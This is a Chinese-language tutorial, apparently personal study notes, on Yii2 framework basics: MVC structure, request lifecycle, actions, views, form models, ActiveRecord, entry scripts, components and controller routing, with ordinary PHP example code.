&lt;h1 id="框架基础">框架基础&lt;/h1>
&lt;p>Yii2 版本: 2.0.16&lt;/p>
&lt;h2 id="应用结构">应用结构&lt;/h2>
&lt;p>下列是框架中最重要的目录和文件&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/KcNU0CK.png" alt="img" />&lt;/p>
&lt;p>Yii 实现了MVC设计模式，这点在上述目录结构中也体现了。models目录包含了所有模型类，views目录包含了所有视图脚本，controllers目录包含了所有控制机器类。&lt;/p>
&lt;p>下图显示了一个应用的静态结构&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/wW8fodH.png" alt="img" />&lt;/p>
&lt;p>每个应用都有一个入口脚本 web/index.php，这是整个应用中唯一可以访问的PHP脚本。入口脚本接受一个Web请求并创建应用实例去处理它。应用在它的组建辅助下解析请求，并分派请求至MVC元素。视图使用小部件（即各种前台标签的类）去创建复杂和动态的用户界面。&lt;/p>
&lt;h2 id="请求生命周期">请求生命周期&lt;/h2>
&lt;p>&lt;img src="https://i.imgur.com/pE7GRnQ.png" alt="img" />&lt;/p>
&lt;ol>
&lt;li>用户向入口脚本 web/index.php 发起请求&lt;/li>
&lt;li>入口脚本加载应用配置并创建一个应用实例去处理请求。&lt;/li>
&lt;li>应用通过请求组件解析请求的路由。&lt;/li>
&lt;li>应用创建一个控制器实例去处理请求。&lt;/li>
&lt;li>控制器创建一个动作实例并针对操作执行过滤器。&lt;/li>
&lt;li>如果任何一个过滤器返回失败，则动作取消。&lt;/li>
&lt;li>如果所有过滤其都通过，动作将被执行。&lt;/li>
&lt;li>动作会加载一个数据模型，或许是来自数据库。&lt;/li>
&lt;li>动作会渲染一个视图，把数据模型提供给它。&lt;/li>
&lt;li>渲染结果返回给响应组件。&lt;/li>
&lt;li>响应组件发送渲染结果给用户浏览器。&lt;/li>
&lt;/ol>
&lt;h1 id="helloworld">HelloWorld&lt;/h1>
&lt;p>安装好Yii后，看看初始页面&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/mOtNpfs.png" alt="img" />&lt;/p>
&lt;p>看上去就已经很漂亮了。&lt;/p>
&lt;p>话说回来，要在应用中创建一个HelloWorld页面，将需要创建一个操作和一个视图：&lt;/p>
&lt;ol>
&lt;li>应用将会分派页面请求给动作&lt;/li>
&lt;li>动作将会依次渲染视图呈现”Hello”给最终用户&lt;/li>
&lt;/ol>
&lt;p>我们需要知道：&lt;/p>
&lt;ul>
&lt;li>如何创建一个动作去响应请求&lt;/li>
&lt;li>如何创建一个视图去构造相应内容&lt;/li>
&lt;li>以及一个应用如何分派请求给动作&lt;/li>
&lt;/ul>
&lt;h2 id="创建动作">创建动作&lt;/h2>
&lt;p>我们将要创建一个say操作，从请求中接收message参数并先显示给最终用户。如果请求没有提供message参数，操作将显示默认参数”Hello”&lt;/p>
&lt;blockquote>
&lt;p>操作是最终用户可以直接访问并执行的对象。操作被组织在控制器中，一个操作的执行结果就是最终用户收到的响应内容。&lt;/p>
&lt;/blockquote>
&lt;p>操作必须声明在控制器中。为了简单起见，可以直接在SiteController控制器里生命say操作。
这个控制器是由文件 controllers/SiteController.php定义的。以下是一个操作的声明：&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
namespace app\controllers;
use yii\web\Controller;
class SiteController extends Controller{
// ...现存的代码...
public function actionSay($message = 'Hello'){
return $this-&amp;gt;render('say',['message' =&amp;gt; $message]);
}
}
&lt;/code>&lt;/pre>&lt;p>在上述代码中，say操作被定义为actionSay方法。 Yii使用action前缀区分普通方法和操作。action前缀后面的名称被映射为操作的ID。&lt;/p>
&lt;p>涉及到给操作命名时，我们应该理解Yii如何处理操作ID。操作ID总是被以小写处理，如果一个操作ID由多个单词组成，单词之间将由连字符连接（如create-comment）。操作ID映射为方法名时，除了连字符，将每个单词首字母大写，并加上action前缀。 例子：操作ID &lt;code>create-comment&lt;/code>相当于方法名 &lt;code>actionCreateComment&lt;/code>&lt;/p>
&lt;p>上述代码中的操作方法接受一个默认值为”Hello”的参数$message，当应用接收到请求并确定由say操作来响应请求时，应用将从请求的参数中寻找对应值传入进来。&lt;/p>
&lt;p>在操作方法中，render()被用来渲染一个名为say的视图文件。 message参数也被传入视图，这样就可以在里面使用。 操作方法会返回渲染结果。 结果会被应用接收并显示给最终用户的浏览器（作为整页HTML的一部分）。&lt;/p>
&lt;h2 id="创建视图">创建视图&lt;/h2>
&lt;p>视图是用来生成响应内容的脚本，为了”HelloWorld”，我们需要创建一个say视图，以便显示从操作方法中传来的message参数。&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
use yii\helpers\Html;
?&amp;gt;
&amp;lt;?= Html::encode($message) ?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>say视图应该存为 &lt;strong>&lt;code>views/site/say.php&lt;/code>&lt;/strong> 文件。&lt;/p>
&lt;p>当一个操作中调用了render()方法时，它将会按 views/控制器ID/视图名.php路径加载PHP文件。&lt;/p>
&lt;p>以上代码中，message参数在输出之前被HTML-encoded方法处理过，因为当参数来自于最终用户时，可能导致XSS。&lt;/p>
&lt;p>其它内容可以自己构造，视图脚本输出的内容将会作为响应结果返回给应用。应用将依次输出结果给最终用户。&lt;/p>
&lt;p>运行
-&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/mKje91t.png" alt="img" />&lt;/p>
&lt;p>这个页面输出了包含”Hello World”的页面，页面有了自带的头部和尾部。&lt;/p>
&lt;blockquote>
&lt;p>render方法会自动把say视图执行的结果嵌入称为布局的文件中，本例中是 views/layouts/main.php&lt;/p>
&lt;/blockquote>
&lt;p>图中URL的参数r代表路由，是整个应用级的。指向特定操作的独立ID。路由格式是 &lt;code>控制器ID / 操作ID&lt;/code>。应用接受请求的时候会检查参数，使用控制器ID去确定哪个控制器应该被用来处理请求。然后相应控制器将使用操作ID去确定哪个操作方法将被用来做具体工作。&lt;/p>
&lt;p>上面的例子中，路由site/say将被解析至Site Controller控制器和其中的say操作。因此，SiteController::actionSay()方法将被调用处理请求。&lt;/p>
&lt;blockquote>
&lt;p>与操作一样，一个应用中控制器同样有唯一的ID，控制器同样有唯一的ID，控制器ID和操作ID使用同样的命名规则。控制器的类名源自于控制器ID，移除了连字符，每个单词首字母大写，并加上Controller后缀。 例： 控制器ID &lt;code>post-comment&lt;/code> 相当于 控制器类名 &lt;code>PostCommentController&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;h1 id="创建模型">创建模型&lt;/h1>
&lt;p>这里通过表单提交，创建一个模型代表用户通过表单输入的数据。&lt;/p>
&lt;p>模型类 EntryForm 代表从用户那请求的数据，该类存储在 models/EntryForm.php 文件中。&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
namespace app\models;
use Yii;
use yii\base\Model;
class EntryForm extends Model{
public $name;
public $email;
public function rules(){
return [
[ ['name','email'] , 'required' ],
[ 'email' , 'email' ],
];
}
}
&lt;/code>&lt;/pre>&lt;p>该类继承自Yii提供的一个基类 yii\base\Model，该基类通常用来表示数据。 它包含两个公共成员，用来储存用户输入的数据。 它还包含一个名为rules()的方法，用来返回数据验证规则。 上面声明的验证规则表示：&lt;/p>
&lt;ol>
&lt;li>name和email值都是必须的&lt;/li>
&lt;li>email的值必须满足email规则验证&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>如果你有一个处理用户提交数据的EntryForm对象，可以调用它的validate()方法触发数据验证。 如果有数据验证失败，则会将hasErrors属性设为 true，想要知道具体发生什么错误就调用 getErrors.&lt;/p>
&lt;/blockquote>
&lt;p>eg:&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
$model = new EntryForm();
$model-&amp;gt;name = &amp;quot;test&amp;quot;;
$model-&amp;gt;email = 'bad';
if($model-&amp;gt;validate()){
// 验证成功
}else{
// 失败，使用 $model-&amp;gt;getErrors() 获取错误详情
}
&lt;/code>&lt;/pre>&lt;h2 id="动作方法">动作方法&lt;/h2>
&lt;p>SiteController中&lt;/p>
&lt;pre tabindex="0">&lt;code>use app\models\EntryForm;
...
public function actionEntry(){
$model = new EntryForm;
if($model-&amp;gt;load(Yii::$app-&amp;gt;request-&amp;gt;post()) &amp;amp;&amp;amp; $model-&amp;gt;validate()){
// 验证 $model 收到的数据
return $this-&amp;gt;render('entry-confirm',['model' =&amp;gt; $model]);
}else{
// 无论是初始化显示还是数据验证错误
return $this-&amp;gt;render('entry',['model' =&amp;gt; $model]);
}
}
&lt;/code>&lt;/pre>&lt;blockquote>
&lt;p>表达式 Yii::$app 是应用实例，它是一个全局可访问的单例。 同时它也是一个服务定位器，能提供 request，response，db 等等特定功能的组件。 在上面的代码里就是使用request组件来访问应用实例收到的$_POST数据。（post方法返回$_POST数组）&lt;/p>
&lt;/blockquote>
&lt;h2 id="创建视图-1">创建视图&lt;/h2>
&lt;p>views/site/entry-confirm.php 视图显示提交的name和email数据。&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
use yii\helpers\Html;
?&amp;gt;
&amp;lt;p&amp;gt;You have entered the following information: &amp;lt;/p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;label&amp;gt;Name&amp;lt;/label&amp;gt;: &amp;lt;?= Html::encode($model-&amp;gt;name) ?&amp;gt;&amp;lt;/li&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;label&amp;gt;Email&amp;lt;/label&amp;gt;: &amp;lt;?= Html::encode($model-&amp;gt;email) ?&amp;gt;&amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;
&lt;/code>&lt;/pre>&lt;p>views/site/entry.php视图显示一个HTML表单&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
use yii\helpers\Html;
use yii\widgets\ActiveForm;
?&amp;gt;
&amp;lt;?php $form = ActiveForm::begin(); ?&amp;gt;
&amp;lt;?= $form-&amp;gt;field($model,'name') ?&amp;gt;
&amp;lt;?= $form-&amp;gt;field($model,'email') ?&amp;gt;
&amp;lt;div class=&amp;quot;form-group&amp;quot;&amp;gt;
&amp;lt;?= Html::submitButton('Submit',['class' =&amp;gt; 'btn btn-primary']) ?&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;?php ActiveForm::end(); ?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>上面的视图使用了小部件 ActiveForm去生成HTML表单。 其中的 begin()和end() 分别用来渲染表单的开始和关闭标签。 在这两个方法之间使用了field()方法去创建输入框。 之后使用 yii\helpers\Html::submitButton() 方法生成提交按钮。&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/nsFd5nM.png" alt="img" />&lt;/p>
&lt;p>ActiveForm会自动将我们在模型中声明的验证规则转化成客户端js脚本执行验证。 但后台我们依旧要再进行一遍验证。&lt;/p>
&lt;h1 id="数据库的使用">数据库的使用&lt;/h1>
&lt;p>config/db.php 配置数据库参数，这个文件配置了数据库连接 yii\db\Connection的创建和初始化参数，应用的SQL查询正是基于这个数据库。&lt;/p>
&lt;p>数据库连接可以在应用中通过Yii::$app-&amp;gt;db表达式访问。&lt;/p>
&lt;p>接下来，我们比如要展示数据库中的一个country表。我们要自己写脚本创建表等等。&lt;/p>
&lt;h2 id="创建activerecord">创建ActiveRecord&lt;/h2>
&lt;p>创建一个Country类，存储在models/Country.php，去代表和读取country表的数据&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
namespace app\models;
use yii\db\ActiveRecord;
class Country extends ActiveRecord{}
&lt;/code>&lt;/pre>&lt;blockquote>
&lt;p>注:如果用Gii生成代码时，报错了，可以覆写tableName()方法去显式指定相关表名&lt;/p>
&lt;/blockquote>
&lt;p>ActiveRecord（活动记录）是面向对象、功能强大的访问和操作数据库数据的方式&lt;/p>
&lt;h2 id="controller">Controller&lt;/h2>
&lt;p>controllers/CountryController.php&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
namespace app\controllers;
use yii\web\Controller;
use yii\data\Pagination;
use app\models\Country;
class CountryController extends Controller
{
public function actionIndex()
{
$query = Country::find();
$pagination = new Pagination([
'defaultPageSize' =&amp;gt; 5,
'totalCount' =&amp;gt; $query-&amp;gt;count(),
]);
$countries = $query-&amp;gt;orderBy('name')
-&amp;gt;offset($pagination-&amp;gt;offset)
-&amp;gt;limit($pagination-&amp;gt;limit)
-&amp;gt;all();
return $this-&amp;gt;render('index', [
'countries' =&amp;gt; $countries,
'pagination' =&amp;gt; $pagination,
]);
}
}
&lt;/code>&lt;/pre>&lt;h2 id="视图">视图&lt;/h2>
&lt;p>views/country/index.php&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
use yii\helpers\Html;
use yii\widgets\LinkPager;
?&amp;gt;
&amp;lt;h1&amp;gt;Countries&amp;lt;/h1&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;?php foreach ($countries as $country): ?&amp;gt;
&amp;lt;li&amp;gt;
&amp;lt;?= Html::encode(&amp;quot;{$country-&amp;gt;name} ({$country-&amp;gt;code})&amp;quot;) ?&amp;gt;:
&amp;lt;?= $country-&amp;gt;population ?&amp;gt;
&amp;lt;/li&amp;gt;
&amp;lt;?php endforeach; ?&amp;gt;
&amp;lt;/ul&amp;gt;
&amp;lt;?= LinkPager::widget(['pagination' =&amp;gt; $pagination]) ?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>访问URL查看效果&lt;/p>
&lt;blockquote>
&lt;p>http://localhost/yii2/index.php?r=country/index&lt;/p>
&lt;/blockquote>
&lt;h1 id="gii">Gii&lt;/h1>
&lt;p>这里不多赘述，它可以帮助我们生成代码，主要注意的内容在上文中有提到，就是有时候找不到对应的数据表，我们需要在模型类中添加静态的tableName()方法。&lt;/p>
&lt;h1 id="进阶总览">进阶总览&lt;/h1>
&lt;p>除了MVC，Yii应用还有以下部分：&lt;/p>
&lt;ol>
&lt;li>&lt;strong>入口脚本&lt;/strong>：终端用户能直接访问的PHP脚本，负责启动一个请求处理周期&lt;/li>
&lt;li>&lt;strong>应用&lt;/strong>：能全局范围内访问的对象，管理协调组件来完成请求。&lt;/li>
&lt;li>&lt;strong>应用组件&lt;/strong>：在应用中注册的对象，提供不同的功能来完成请求。&lt;/li>
&lt;li>&lt;strong>模块&lt;/strong>：包含完整MVC结构的独立包，一个应用可以由多个模块组建。&lt;/li>
&lt;li>&lt;strong>过滤器&lt;/strong>：控制器在处理请求之前或之后需要触发执行的代码&lt;/li>
&lt;li>&lt;strong>小部件&lt;/strong>：可嵌入到试图中的对象，可包含控制器逻辑，可被不同视图重复调用&lt;/li>
&lt;/ol>
&lt;h1 id="入口脚本">入口脚本&lt;/h1>
&lt;p>一个应用（网页应用或是控制台应用）只有一个入口脚本，终端用户的请求通过入口脚本实例化应用并将请求转发到应用。&lt;/p>
&lt;p>控制台应用的入口脚本一般在应用根目录下命名为yii，该文件需要有执行权限，这样用户就能通过命令 &lt;code>./yii &amp;lt;route&amp;gt; [arguments][options]&lt;/code>来运行控制台应用&lt;/p>
&lt;p>&lt;strong>入口脚本主要完成以下工作：&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>定义全局常量&lt;/li>
&lt;li>注册Composer自动加载器&lt;/li>
&lt;li>包含Yii类文件&lt;/li>
&lt;li>加载应用配置&lt;/li>
&lt;li>创建一个应用实例并配置&lt;/li>
&lt;li>调用yii\base\Application::run()来处理请求&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="定义常量">定义常量&lt;/h2>
&lt;p>入口脚本是定义全局常量的最好地方，Yii支持以下三个常量：&lt;/p>
&lt;ol>
&lt;li>YII_DEBUG：表示应用是否运行在调试模式，默认false&lt;/li>
&lt;li>YII_ENV：表示应用运行的环境，默认 dev ，表示线上产品环境&lt;/li>
&lt;li>YII_ENABLE_ERROR_HANDLER：标识是否启用Yii提供的错误处理，默认true&lt;/li>
&lt;/ol>
&lt;h1 id="应用主体">应用主体&lt;/h1>
&lt;p>&lt;strong>应用主体&lt;/strong>是管理Yii应用系统整体结构和生命周期的对象。每个Yii应用系统只能包含一个应用主体，应用主体在入口脚本中创建并能通过表达式 \Yii::$app全局范围内访问。&lt;/p>
&lt;h2 id="应用主体配置">应用主体配置&lt;/h2>
&lt;p>入口脚本index.php代码&lt;/p>
&lt;pre tabindex="0">&lt;code>require __DIR__ . '/../vendor/autoload.php';
require __DIR__ . '/../vendor/yiisoft/yii2/Yii.php';
$config = require __DIR__ . '/../config/web.php';
(new yii\web\Application($config))-&amp;gt;run();
&lt;/code>&lt;/pre>&lt;p>当入口脚本创建了一个应用主体，它会加载一个配置文件并传给应用主体。&lt;/p>
&lt;p>类似其它配置文件，应用主体配置文件标明如何设置应用对象初始属性。由于应用主体配置比较复杂，一般保存在多个类似如上web.php的配置文件中。&lt;/p>
&lt;p>关于web.php配置文件属性的介绍内容也比较多，可以直接参照官方文档。&lt;/p>
&lt;p>&lt;a class="link" href="https://www.yiichina.com/doc/guide/2.0/structure-applications" target="_blank" rel="noopener"
>https://www.yiichina.com/doc/guide/2.0/structure-applications&lt;/a>&lt;/p>
&lt;p>注:&lt;/p>
&lt;ol>
&lt;li>所谓注册组件，就是注册以后，可以通过一个表达式进行全局访问。&lt;/li>
&lt;/ol>
&lt;h2 id="应用事件">应用事件&lt;/h2>
&lt;p>配置文件中，还可以写入请求事件的函数，比如发起请求前先如何处理，后如何处理。&lt;/p>
&lt;h2 id="应用主体生命周期">应用主体生命周期&lt;/h2>
&lt;p>&lt;img src="https://i.imgur.com/IHX4boN.png" alt="img" />&lt;/p>
&lt;p>当运行入口脚本处理请求时，应用主体会经历以下生命周期：&lt;/p>
&lt;ol>
&lt;li>入口脚本加载应用主体配置数组&lt;/li>
&lt;li>入口脚本创建一个应用主体实例：
&lt;ol>
&lt;li>调用preInit()配置几个高级别应用主体属性，比如basePath。&lt;/li>
&lt;li>注册error handler 错误处理方法&lt;/li>
&lt;li>配置应用主体属性&lt;/li>
&lt;li>调用init()初始化，该函数会调用bootstrap()运行引导启动组件&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>入口脚本调用 yii\base\Application::run()运行应用主体
&lt;ol>
&lt;li>触发 &lt;code>EVENT_BEFORE_REQUEST&lt;/code>事件&lt;/li>
&lt;li>处理请求：解析请求路由和相关参数；创建路由指定的模块、控制器和动作对应的类，并运行动作&lt;/li>
&lt;li>触发 &lt;code>EVENT_AFTER_REQUEST&lt;/code>事件&lt;/li>
&lt;li>发送响应到终端用户&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>入口脚本接收应用主体传来的退出状态并完成请求的处理&lt;/li>
&lt;/ol>
&lt;h1 id="应用组件">应用组件&lt;/h1>
&lt;p>应用主体是服务定位器，它部署一组提供各种不同功能的应用组件来处理请求。 例如，urlManager组件负责处理网页请求路由到对应的控制器。db组件提供数据库相关服务等等。&lt;/p>
&lt;p>在同一个应用中，每个应用组件都有一个独一无二的ID用来区分其它应用组件，你可以通过如下表达式访问应用组件。&lt;/p>
&lt;blockquote>
&lt;p>\Yii::$app-&amp;gt;componentID&lt;/p>
&lt;/blockquote>
&lt;p>例如，可以使用 \Yii::$app-&amp;gt;db来获取到已注册应用的DB connection，使用\Yii::$app-&amp;gt;cache来获取到已注册到应用的primary cache&lt;/p>
&lt;p>注：&lt;/p>
&lt;ol>
&lt;li>
&lt;p>第一次使用以上表达式的时候会创建应用组件实例，后续再次访问会返回此实例，无需创建。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>应用组件可以是任意对象，可以在 应用主体配置 配置 yii\base\Application::$components属性。&lt;/p>
&lt;p>eg:&lt;/p>
&lt;pre tabindex="0">&lt;code>[
'components' =&amp;gt; [
// 使用类名注册 &amp;quot;cache&amp;quot; 组件
'cache' =&amp;gt; 'yii\caching\ApcCache',
// 使用配置数组注册 &amp;quot;db&amp;quot; 组件
'db' =&amp;gt; [
'class' =&amp;gt; 'yii\db\Connection',
'dsn' =&amp;gt; 'mysql:host=localhost;dbname=demo',
'username' =&amp;gt; 'root',
'password' =&amp;gt; '',
],
// 使用函数注册&amp;quot;search&amp;quot; 组件
'search' =&amp;gt; function () {
return new app\components\SolrService;
},
],
]
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>应用组件就像全局变量， 使用太多可能加大测试和维护的难度。 一般情况下可以在需要时再创建本地组件。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>核心应用组件&lt;/strong>&lt;/p>
&lt;p>Yii定义了一组固定ID和默认配置的核心组件，例如request组件用来收集用户请求并解析路由；db代表一个可以执行数据库操作的数据库连接。通过这些组件，Yii应用主体能处理用户请求。&lt;/p>
&lt;h1 id="控制器">控制器&lt;/h1>
&lt;p>控制器是继承 &lt;code>yii\base\Controller&lt;/code> 类的对象，负责处理请求和生成响应。 具体来说，控制器从&lt;strong>应用主体&lt;/strong>接管控制后会分析请求数据并传送到&lt;strong>模型&lt;/strong>，传送模型结果到&lt;strong>视图&lt;/strong>，最后生成输出响应信息。&lt;/p>
&lt;h2 id="动作">&lt;strong>动作&lt;/strong>&lt;/h2>
&lt;p>控制器由 &lt;strong>操作&lt;/strong> 组成，如action+操作名ID&lt;/p>
&lt;h2 id="路由">&lt;strong>路由&lt;/strong>&lt;/h2>
&lt;p>用户通过 &lt;strong>路由&lt;/strong> 寻找到动作，路由是包含以下部分的字符串：&lt;/p>
&lt;ol>
&lt;li>模块ID：仅存在于控制器属于非应用的模块&lt;/li>
&lt;li>控制器ID：同应用下唯一标识控制器的字符串&lt;/li>
&lt;li>操作ID：同控制器下唯一标识操作的字符串&lt;/li>
&lt;/ol>
&lt;p>路由格式：&lt;/p>
&lt;blockquote>
&lt;p>ControllerID/ActionID&lt;/p>
&lt;/blockquote>
&lt;p>如果属于模块下的控制器，格式：&lt;/p>
&lt;p>ModuleID/ControllerID/ActionID&lt;/p>
&lt;p>如果用户的请求地址为 &lt;code>http://hostname/index.php?r=site/index&lt;/code>，会执行site控制器的index操作&lt;/p>
&lt;h2 id="控制器id">&lt;strong>控制器ID&lt;/strong>&lt;/h2>
&lt;p>控制器ID应仅包含英文小写字母、数字、下划线、中横杠和正斜杠&lt;/p>
&lt;p>控制器ID可包含子目录前缀，例如admin/article代表&lt;code>controller namespace&lt;/code> 控制器命名空间下&lt;code>admin&lt;/code>子目录中&lt;code>article&lt;/code>控制器。子目录前缀可为英文大小写字母、数字、下划线、正斜杠，其中正斜杠用来区分多级子目录（如&lt;code>panels/admin&lt;/code>）&lt;/p>
&lt;h2 id="控制器类命名">&lt;strong>控制器类命名&lt;/strong>&lt;/h2>
&lt;p>控制器ID遵循以下规则&lt;strong>衍生&lt;/strong>控制器类名：&lt;/p>
&lt;ol>
&lt;li>将用正斜杠区分的每个单词第一个字母转为大写。 注意如果控制器ID包含正斜杠，只将最后的正斜杠后的部分第一个字母转为大写&lt;/li>
&lt;li>去掉中横杠，将正斜杠替换为反斜杠&lt;/li>
&lt;li>增加Controller后缀&lt;/li>
&lt;li>在前面增加controller namespace控制器命名控件&lt;/li>
&lt;/ol>
&lt;p>示例（假设&lt;code>controller namespace&lt;/code>控制器命名空间为&lt;code>app\controllers&lt;/code>）：&lt;/p>
&lt;ul>
&lt;li>article 对应 app\controllers\ArticleController&lt;/li>
&lt;li>post-comment 对应 app\controllers\PostCommentController&lt;/li>
&lt;li>admin/post-comment 对应 app\controllers\admin\PostCommentController&lt;/li>
&lt;li>adminPanels/post-comment 对应 app\controllers\adminPanels\PostCommentController&lt;/li>
&lt;/ul>
&lt;p>控制器类必须能被&lt;strong>自动加载&lt;/strong>，所以在上面的例子中，控制器article类应在&lt;strong>别名&lt;/strong>为 &lt;code>@app/controllers/ArticleController.php&lt;/code>的文件中定义，控制器 &lt;code>admin/post-comment&lt;/code>应在 &lt;code>@app/controllers/admin/PostCommentController.php&lt;/code>文件中&lt;/p>
&lt;h2 id="控制器部署">&lt;strong>控制器部署&lt;/strong>&lt;/h2>
&lt;p>可通过配置&lt;code>controller map&lt;/code>来强制上述的控制器ID和类名对应，通常用在使用第三方不能掌控类名的控制器上&lt;/p>
&lt;p>eg:&lt;/p>
&lt;pre tabindex="0">&lt;code>[
'controllerMap' =&amp;gt; [
// 用类名申明 &amp;quot;account&amp;quot; 控制器
'account' =&amp;gt; 'app\controllers\UserController',
// 用配置数组申明 &amp;quot;article&amp;quot; 控制器
'article' =&amp;gt; [
'class' =&amp;gt; 'app\controllers\PostController',
'enableCsrfValidation' =&amp;gt; false,
],
],
]
&lt;/code>&lt;/pre>&lt;h2 id="创建动作-1">创建动作&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>动作ID&lt;/p>
&lt;p>操作ID应仅包含英文小写字母、苏子、下划线和中横杠，操作ID中的中横杠用来分割单词。&lt;/p>
&lt;p>可通过两种方式创建操作ID，&lt;/p>
&lt;ul>
&lt;li>
&lt;p>内联操作：在控制器类中定义为方法&lt;/p>
&lt;/li>
&lt;li>
&lt;p>独立操作：是继承yii\base\Action或它的子类的类&lt;/p>
&lt;p>内联操作容易创建，在无需重用的情况下优先使用，独立操作相反，主要用于多个控制器重用，或重构为&lt;strong>扩展&lt;/strong>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>内联动作&lt;/p>
&lt;p>动作方法的名字是根据操作ID遵循如下规则生成:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>将每个单词的第一个字母转为大写&lt;/p>
&lt;/li>
&lt;li>
&lt;p>去掉中横杠&lt;/p>
&lt;/li>
&lt;li>
&lt;p>增加action前缀&lt;/p>
&lt;p>eg: index转成actionIndex, hello-world 转成 actionHelloWorld&lt;/p>
&lt;blockquote>
&lt;p>注： 操作方法的名字大小写敏感，如果方法名称为ActionIndex不会认为是操作方法，所以请求index操作会返回一个异常，也要注意操作方法必须是公有的，私有或受保护的方法不能定义为内联操作。&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>独立动作&lt;/p>
&lt;p>独立操作通过继承 &lt;code>yii\base\Action&lt;/code> 或它的子类来定义。 例如Yii发布的 &lt;code>yii\web\ViewAction&lt;/code> 和 &lt;code>yii\web\ErrorAction&lt;/code> 都是独立操作&lt;/p>
&lt;p>要使用独立操作，需要通过控制器中覆盖 &lt;code>yii\base\Controller::actions()&lt;/code> 方法在 action map中声明，如下例所示：&lt;/p>
&lt;pre tabindex="0">&lt;code>public function actions()
{
return [
// 用类来申明&amp;quot;error&amp;quot; 动作
'error' =&amp;gt; 'yii\web\ErrorAction',
// 用配置数组申明 &amp;quot;view&amp;quot; 动作
'view' =&amp;gt; [
'class' =&amp;gt; 'yii\web\ViewAction',
'viewPrefix' =&amp;gt; '',
],
];
}
&lt;/code>&lt;/pre>&lt;p>如上所示，actions()方法返回 键为操作ID、值为对应操作类名或数组 configurations 的数组。 和内联操作不同，独立操作ID可包含任意字符，只要在actions()方法中声明。&lt;/p>
&lt;p>为创建一个独立操作类，需要继承 &lt;code>yii\base\Action&lt;/code> 或它的子类，并实现公有的名称为run()的方法，run()方法的角色和操作方法类似，例如：&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
namespace app\components;
use yii\base\Action;
class HelloWorldAction extends Action
{
public function run()
{
return &amp;quot;Hello World&amp;quot;;
}
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>动作结果&lt;/p>
&lt;p>操作方法或独立操作的run()方法的返回值非常重要，它表示对应操作结果&lt;/p>
&lt;p>返回值可为响应对象，作为响应发送给终端用户。&lt;/p>
&lt;ul>
&lt;li>
&lt;p>对于网页应用，返回值可为任意数据，它复制给 &lt;code>yii\web\Respinse::$data&lt;/code>，最终转换为字符串来展示响应内容&lt;/p>
&lt;/li>
&lt;li>
&lt;p>对于控制台应用，返回值可为整数，表示命令行下执行的exit status 退出状态&lt;/p>
&lt;p>在上面的例子中，操作结果都为字符串，作为响应数据发送给终端用户，下例显示一个操作通过返回响应对象（因为redirect()方法返回一个响应对象）可将用户浏览器跳转到新的URL&lt;/p>
&lt;p>public function actionForward()
{&lt;/p>
&lt;pre tabindex="0">&lt;code>// 用户浏览器跳转到 http://example.com
return $this-&amp;gt;redirect('http://example.com');
&lt;/code>&lt;/pre>&lt;p>}&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>动作参数&lt;/p>
&lt;p>内联动作的操作方法和独立动作的run()方法可以带参数，成为动作参数。 参数值从请求中获取，对于 网页应用，每个动作参数的值从$_GET中获得，参数名作为键；对于控制台应用，动作参数对应命令行参数。&lt;/p>
&lt;p>如下例，动作view（内联动作）声明了两个参数 $id 和 $version&lt;/p>
&lt;pre tabindex="0">&lt;code>namespace app\controllers;
use yii\web\Controller;
class PostController extends Controller
{
public function actionView($id, $version = null)
{
// ...
}
}
&lt;/code>&lt;/pre>&lt;p>动作参数会被不同的参数填入，如下所示：&lt;/p>
&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>+ http://hostname/index.php?r=post/view&amp;amp;id=123: $id 会填入'123'， $version 仍为 null 空因为没有version请求参数;
+ http://hostname/index.php?r=post/view&amp;amp;id=123&amp;amp;version=2: $id 和 $version 分别填入 '123' 和 '2'`；
+ http://hostname/index.php?r=post/view: 会抛出yii\web\BadRequestHttpException 异常 因为请求没有提供参数给必须赋值参数$id；
+ http://hostname/index.php?r=post/view&amp;amp;id[]=123: 会抛出yii\web\BadRequestHttpException 异常 因为 $id 参数收到数组值 ['123'] 而不是字符串.
如果你想要一个动作参数来接收数组值，你应该使用array来提示它，如下所示：
public function actionView(array $id, $version = null)
{
// ...
}
